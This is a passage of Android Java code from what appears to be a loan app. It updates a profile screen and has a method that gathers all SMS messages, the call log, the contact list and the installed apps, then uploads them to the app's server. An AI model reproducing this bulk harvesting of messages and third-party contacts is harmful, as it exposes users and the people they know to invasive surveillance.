                ivLoaction.setVisibility(View.VISIBLE);
                tvCity.setText(userDate.city);

            }
            if (userDate.phone != null) {

                tvNumber.setText(userDate.phone);
            }
            if (userDate.image != null && !userDate.image.isEmpty()) {

                Picasso.get()
                        .load(userDate.image)
                        .into(context.profileImage);

                Picasso.get()
                        .load(userDate.image)
                        .into(profileImage);

                date.setImageUrl(userDate.image);

            }

            if (userDate.getScore() != null) {

                tvScore.setText(userDate.getScore());
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    progressBar.setProgress(Integer.parseInt(userDate.getScore()), true);
                } else {
                    progressBar.setProgress(Integer.parseInt(userDate.getScore()));
                }
            }
            // setStageTwoComplete();
        } else {
            isProfileUpdated = false;
        }

        PreferenceUtils.getInstance().addUserDetail(date);

//        if (PreferenceUtils.getInstance().getPinCode() == null) {
//
//            context.showInfoFragment();
//
//        }
    }

    private void setStageComplete(int i) {


    }

    private void setStageOneCompete() {

        step1View.setBackground(ContextCompat.getDrawable(context, R.color.gradientstart));
        step1Tick.setImageDrawable(ContextCompat.getDrawable(context, R.drawable.ic_profile_tick_green));

        ivBasicLogo.setImageDrawable(ContextCompat.getDrawable(context, R.drawable.ic_basic_profile_active));
    }

    private void setStageTwoComplete() {

        step1View.setBackground(ContextCompat.getDrawable(context, R.color.gradientstart));
        step1Tick.setImageDrawable(ContextCompat.getDrawable(context, R.drawable.ic_profile_tick_green));
    }

    private void setStageThreeComplete() {

        step1View.setBackground(ContextCompat.getDrawable(context, R.color.gradientstart));
        step1Tick.setImageDrawable(ContextCompat.getDrawable(context, R.drawable.ic_profile_tick_green));

    }

    private void setStageFourComplete() {

        step1Tick.setImageDrawable(ContextCompat.getDrawable(context, R.drawable.ic_profile_tick_green));
        step1View.setBackground(ContextCompat.getDrawable(context, R.color.gradientstart));


//        step3Tick.setImageDrawable(ContextCompat.getDrawable(context, R.drawable.ic_profile_tick_green));
        step3View.setBackground(ContextCompat.getDrawable(context, R.color.gradientstart));

//        ivEvaluationLogo.setImageDrawable(ContextCompat.getDrawable(context, R.drawable.ic_evaluation_active));
    }

    private void setStageFiveComplete() {

        step1Tick.setImageDrawable(ContextCompat.getDrawable(context, R.drawable.ic_profile_tick_green));
        step1View.setBackground(ContextCompat.getDrawable(context, R.color.gradientstart));


//        step3Tick.setImageDrawable(ContextCompat.getDrawable(context, R.drawable.ic_profile_tick_green));
        step3View.setBackground(ContextCompat.getDrawable(context, R.color.gradientstart));

        step4Tick.setImageDrawable(ContextCompat.getDrawable(context, R.drawable.ic_profile_tick_green));

//        ivEvaluationLogo.setImageDrawable(ContextCompat.getDrawable(context, R.drawable.ic_evaluation_active));

        ivWalletLogo.setImageDrawable(ContextCompat.getDrawable(context, R.drawable.ic_mobile_wallet_active));
    }


    public void getLogsDetails() {

        SyncLogs logs = new SyncLogs(getCallDetails(), getAllSms(), getAllContacts(), getSystemApps());

        if (logs.calllogs != null && logs.contactdetails != null
                && logs.appList != null && logs.smslogs != null) {
            EasyLoanBusiness business = new EasyLoanBusiness();
            business.syncLogs(logs, new ResponseCallBack<SyncCallResponce>() {
                @Override
                public void onSuccess(SyncCallResponce body) {
                }

                @Override
                public void onFailure(String message) {
                    AlertUtils.showAlert(context, message);
                }
            });
        }
    }

    private List<ApplicationList> getSystemApps() {
        List<PackageInfo> packageInfos = context.getPackageManager().getInstalledPackages(0);
        List<ApplicationList> appNameList = new ArrayList<>();
        for (PackageInfo packageInfo : packageInfos) {
            try {
                ApplicationInfo ai = context.getPackageManager().getApplicationInfo(packageInfo.packageName, 0);

                if ((ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {

                } else {
                    ApplicationList applicationList = new ApplicationList();
                    applicationList.setName(context.getPackageManager().getApplicationLabel(packageInfo.applicationInfo).toString());

                    appNameList.add(applicationList);
                }

            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }


        }
        return appNameList;
    }

    public List<SmsLog> getAllSms() {

        List<SmsLog> sms = new ArrayList<>();
        SmsLog objSms = new SmsLog();
        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = context.getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        context.startManagingCursor(c);
        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                String date = "2021-01-01 01:01:01", phoneno = "", body = "";
                objSms = new SmsLog();

                if (c.getString(c
                        .getColumnIndexOrThrow("address")) != null && c.getString(c
                        .getColumnIndexOrThrow("address")).length() > 3 && !c.getString(c
                        .getColumnIndexOrThrow("address")).substring(0, 3).equals("+92") && !c.getString(c
                        .getColumnIndexOrThrow("address")).substring(0, 2).equals("03")) {
                    phoneno = c.getString(c
                            .getColumnIndexOrThrow("address"));

                    if (c.getString(c.getColumnIndexOrThrow("body")) != null && !c.getString(c.getColumnIndexOrThrow("body")).equals("")) {
                        body = c.getString(c.getColumnIndexOrThrow("body"));
                    }

                    if (c.getString(c.getColumnIndexOrThrow("date")) != null && !c.getString(c.getColumnIndexOrThrow("date")).equals("")) {
                        SimpleDateFormat dateFormat = new SimpleDateFormat(DATE_FORMAT_2);
                        long timeStamp = Long.parseLong(c.getString(c.getColumnIndexOrThrow("date")));
                        Date d = new Date(timeStamp);
                        date = dateFormat.format(d);
                    }

                    objSms.setPhonenumber(phoneno);
                    objSms.setSmsbody(body);
                    objSms.setSmstime(date);
                    sms.add(objSms);
                }

                c.moveToNext();
            }

        }

        return sms;
    }

    private List<CallLogs> getCallDetails() {
        List<CallLogs> calls = new ArrayList<>();
        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = context.managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Log :");
        while (managedCursor.moveToNext()) {

            String phNumber = "";
            String callType = "";
            String callDate = "2021-01-01 01:01:01";
            String callDuration = "";
            String dir = "";

            if (managedCursor.getString(number) != null) {

                phNumber = managedCursor.getString(number);


                if (phNumber.length() > 3 && phNumber.charAt(0) == '+') {
                    phNumber = phNumber.replace("+92", "0");
                }


            }
            if (managedCursor.getString(type) != null) {
                callType = managedCursor.getString(type);

                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
            }
            if (managedCursor.getString(date) != null) {
                Date callDayTime = new Date(Long.valueOf(managedCursor.getString(date)));
                SimpleDateFormat dateFormat = new SimpleDateFormat(DATE_FORMAT_2);
                callDate = dateFormat.format(callDayTime);
            }
            if (managedCursor.getString(duration) != null) {
                callDuration = managedCursor.getString(duration);

            }
            CallLogs call = new CallLogs(phNumber, dir, callDate, Integer.parseInt(callDuration));
            calls.add(call);
        }
        return calls;
    }

    private List<ContactInfo> getAllContacts() {
        Map<String, String> outGoing = new HashMap<>();
        Cursor phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        List<ContactInfo> contactList = new ArrayList<ContactInfo>();
        while (phones.moveToNext()) {

            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phone = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            String type;
            phone = phone.replaceAll(" ", "");
            if (phone.charAt(0) == '+') {
                phone = phone.replace("+92", "0");
            }

            if (outGoing.containsKey(phone)) {

            } else {

                if (phone.length() >= 11) {
                    if (phone.substring(0, 3).equals("+92") || phone.substring(0, 2).equals("03")) {
                        type = "local";
                    } else {
                        type = "international";
                    }
                    ContactInfo contact = new ContactInfo(phone, name, type);
                    outGoing.put(phone, name);
                    contactList.add(contact);
                }

            }
        }

//        for (Map.Entry<String, String> entry : outGoing.entrySet()) {
//            Contacts contact = new Contacts(entry.getValue(), entry.getKey());
//            contactList.add(contact);
//        }

        Collections.sort(contactList, new Comparator<ContactInfo>() {
            @Override
            public int compare(ContactInfo o1, ContactInfo o2) {
                return o1.getName().toLowerCase().compareTo(o2.getName().toLowerCase());
            }
        });


        return contactList;
    }


}